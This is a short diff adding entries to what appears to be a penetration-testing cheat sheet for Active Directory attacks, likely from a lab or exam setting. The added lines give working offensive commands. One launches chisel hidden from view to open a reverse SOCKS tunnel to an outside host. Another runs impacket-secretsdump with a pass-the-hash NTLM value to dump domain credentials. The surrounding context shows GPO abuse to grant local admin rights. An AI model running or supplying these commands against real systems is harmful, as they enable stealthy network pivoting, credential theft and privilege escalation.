@@ -3235,6 +3235,17 @@ GPO Abuse
 .\standin.exe --gpo --filter "Default Domain Policy" --localadmin charlotte
 ```
 
+powershell process hidden 
+
+```
+Start-Process -FilePath "chisel.exe" -ArgumentList "client 192.168.45.161:8080 R:socks" -WindowStyle Hidden
+```
+
+secretdump / dcsync pth
+
+```
+proxychains impacket-secretsdump beccy@172.16.71.240 -hashes :f0397ec5af49971f6efbdb07877046b3
+```
 
 tcpdump packet inspection
 
